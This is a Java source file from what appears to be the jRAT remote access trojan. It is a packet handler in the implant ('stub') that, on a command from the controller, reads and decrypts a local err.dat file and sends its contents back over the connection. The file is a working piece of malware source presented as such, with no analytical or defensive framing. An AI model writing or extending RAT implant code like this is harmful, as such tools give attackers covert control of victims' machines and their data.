package io.jrat.stub.packets.incoming;

import io.jrat.common.crypto.Crypto;
import io.jrat.stub.Connection;
import io.jrat.stub.Main;
import io.jrat.stub.packets.outgoing.Packet65ErrorLog;
import io.jrat.stub.utils.Utils;

import java.io.FileInputStream;


public class Packet86ErrorLog extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		try {
			FileInputStream in = new FileInputStream("err.dat");
			String str = Utils.readString(in);
			in.close();

			con.addToSendQueue(new Packet65ErrorLog(Crypto.decrypt(str, Main.getKey())));
		} catch (Exception ex) {
			con.addToSendQueue(new Packet65ErrorLog("Could not load error log file: err.dat: " + ex.getClass().getSimpleName() + ": " + ex.getMessage()));
		}
	}

}
